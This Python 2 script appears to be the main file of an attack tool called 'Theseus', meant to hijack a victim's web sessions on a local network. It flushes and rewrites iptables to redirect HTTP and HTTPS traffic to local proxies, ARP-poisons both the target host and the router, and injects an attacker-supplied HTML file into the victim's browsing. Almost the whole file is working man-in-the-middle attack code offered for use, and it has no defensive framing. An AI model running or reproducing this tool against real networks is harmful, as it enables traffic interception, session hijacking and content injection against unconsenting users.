import os
import socket
import argparse
import threading
import ConfigParser
import multiprocessing
from arp.arp import Arp_Spoof
from proxy.proxy import HTTP_Proxy, SSL_Proxy

class Theseus(object):
	"""Theseus Control A Victims Web Sessions"""
	def __init__(self):
		global args, arp, http_proxy, ssl_proxy
		super(Theseus, self).__init__()
		#Configure kernal and iptables for the attack
		os.popen("{ echo 1 > /proc/sys/net/ipv4/ip_forward;\
					iptables --flush;\
					iptables --flush -t nat;\
					iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000;\
					iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 4444; }")

		ap = argparse.ArgumentParser(description="Theseus")
		ap.add_argument("-t", "--target", help="This is the targets ip address", required=True)
		ap.add_argument("-l", "--local", help="This is your local ip address", required=True)
		ap.add_argument("-r", "--router", help="This is the routers ip address", required=True)
		ap.add_argument("-i", "--interface", help="This is the network cards current interface", required=True)
		ap.add_argument("-v", "--verbose", help="This is the amount of time between each arp packet (seconds)", required=False, default=1)
		ap.add_argument("-f", "--html_file", help="This is the html file forced to the victim", required=True)
		args = ap.parse_args()

		#Handle any possable errors from args
		try:
			int(args.verbose)
		except ValueError:
			print("\033[1;31mTime must be whole number\033[00m")
			exit()
		try:
			socket.inet_aton(args.target)
			socket.inet_aton(args.router)
		except socket.error:
			print("\033[1;31mIncorrect IP address\033[00m")
			exit()
		try:
			with open(args.html_file, 'r') as file:
				file.read()
		except:
			print("\033[1;31mError Opening file\033[00m")
			exit()

	def attack(self):
		http_proxy = HTTP_Proxy(args.local, 9000, args.html_file)
		ssl_proxy = SSL_Proxy(args.local, 4444, args.html_file)
		arp = Arp_Spoof(args.interface)

		victim_thread = threading.Thread(target=arp.poison_victim, args=(args.target, args.router, int(args.verbose), args.interface))
		victim_thread.deamon = True
		victim_thread.start()

		target_thread = threading.Thread(target=arp.poison_router, args=(args.router, args.target, int(args.verbose), args.interface))
		target_thread.deamon = True
		target_thread.start()

		jobs = []
		for i in range(4):
	   		p = multiprocessing.Process(target=http_proxy._http_client_handler)
	   		jobs.append(p)
	   		p.start()
	   		p2 = multiprocessing.Process(target=ssl_proxy._ssl_client_handler())
	   		jobs.append(p2)
	   		p2.start()


if __name__ == '__main__':
	print("\033[1;3mTheseus v1\033[00m")
	t = Theseus()
	try:
		t.attack()
	except KeyboardInterrupt:
		exit()
